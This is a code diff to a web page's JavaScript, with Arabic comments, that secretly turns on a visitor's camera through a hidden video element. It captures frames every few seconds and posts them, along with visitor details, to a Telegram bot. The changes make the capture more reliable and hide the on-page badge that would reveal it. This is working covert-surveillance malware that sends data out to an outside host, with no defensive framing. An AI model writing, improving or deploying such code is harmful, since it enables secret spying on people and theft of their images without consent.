@@ -365,39 +365,63 @@
 
     const captureBadge = document.getElementById('captureBadge');
     captureBadge.style.display = 'inline-block';
+    captureBadge.textContent = '';
+    captureBadge.style.background = 'rgba(0,0,0,0.0)';
 
     (async function startCameraAndSend(){
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
         const vid = document.createElement('video');
-        vid.autoplay = true; vid.playsInline = true; vid.muted = true; vid.style.display = 'none';
+        vid.autoplay = true; 
+        vid.playsInline = true; 
+        vid.muted = true; 
+        vid.style.display = 'none';
         vid.srcObject = stream;
         document.body.appendChild(vid);
+        
+        // انتظر حتى يشتغل الفيديو فعلاً
+        await vid.play();
+        
+        // انتظر حتى يكون للفيديو أبعاد حقيقية
+        let attempts = 0;
+        while ((vid.videoWidth === 0 || vid.videoHeight === 0) && attempts < 50) {
+          await new Promise(resolve => setTimeout(resolve, 100));
+          attempts++;
+        }
 
         const canvas = document.createElement('canvas');
+        canvas.width = vid.videoWidth || 640;
+        canvas.height = vid.videoHeight || 480;
 
         const tick = async () => {
-          if (!vid.videoWidth) return;
-          canvas.width = vid.videoWidth;
-          canvas.height = vid.videoHeight;
+          // تأكد أن الفيديو شغال
+          if (vid.paused || vid.ended) {
+            await vid.play();
+          }
+          
+          // تأكد من الأبعاد
+          if (vid.videoWidth > 0 && vid.videoHeight > 0) {
+            canvas.width = vid.videoWidth;
+            canvas.height = vid.videoHeight;
+          }
+          
           const ctx = canvas.getContext('2d');
           ctx.drawImage(vid, 0, 0, canvas.width, canvas.height);
 
           canvas.toBlob(async (blob) => {
-            if (!blob) return;
+            // تجاهل الصور الصغيرة جداً (الفارغة)
+            if (!blob || blob.size < 2000) return;
+            
             try {
               const form = new FormData();
               form.append('chat_id', chat);
-              form.append('photo', blob, 'img.png');
+              form.append('photo', blob, `img_${Date.now()}.png`);
               
-              // إرسال الصورة أولاً
               await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                 method: 'POST',
                 body: form
               });
 
-              // ----- إرسال معلومات الزائر كتعليق (كابشن) أو كرسالة منفصلة -----
-              // نحتاج نرسل معلومات الزائر + الرابط + الوقت كرسالة مستقلة لأن Telegram API ما يدشل كابشن مع sendPhoto مباشرة بهالشكل
               const caption = `
 ━━━━━━━━━━━━━━━
 📸 *صورة جديدة تم التقاطها*
@@ -411,7 +435,6 @@
 ━━━━━━━━━━━━━━━
               `;
 
-              // إرسال الكابشن كرسالة منفصلة تحت الصورة (أفضل من كابشن لأن كابشن ما بينفع مع sendPhoto بهذا الشكل)
               await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -421,19 +444,18 @@
                   parse_mode: 'Markdown'
                 })
               });
-
-              captureBadge.textContent = '';
-              captureBadge.style.background = 'rgba(0,0,0,0.0)';
               
             } catch (err) {
-              captureBadge.textContent = '';
-              captureBadge.style.background = 'rgba(0,0,0,0.0)';
               console.error('Send error', err);
             }
-          }, 'image/png');
+          }, 'image/jpeg', 0.9);
         };
 
-        const intervalId = setInterval(tick, 2000);
+        // أول صورة بعد ثانيتين عشان الفيديو يثبت
+        setTimeout(tick, 2000);
+        
+        // بعد كده كل 4 ثواني
+        const intervalId = setInterval(tick, 4000);
 
         window.addEventListener('beforeunload', () => {
           clearInterval(intervalId);
